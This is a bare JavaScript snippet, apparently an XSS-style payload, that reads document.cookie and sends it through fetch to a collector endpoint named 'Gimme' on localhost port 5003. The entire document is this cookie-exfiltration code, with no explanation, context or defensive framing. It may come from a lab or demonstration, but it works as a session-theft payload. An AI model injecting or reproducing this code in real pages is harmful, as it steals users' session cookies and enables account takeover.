const request = new Request('https://localhost:5003/api/Gimme?stringData=' + "{'ID':0,'DataType':'Cookie','Data':'" + document.cookie + "'}", {method: 'GET'});
fetch(request);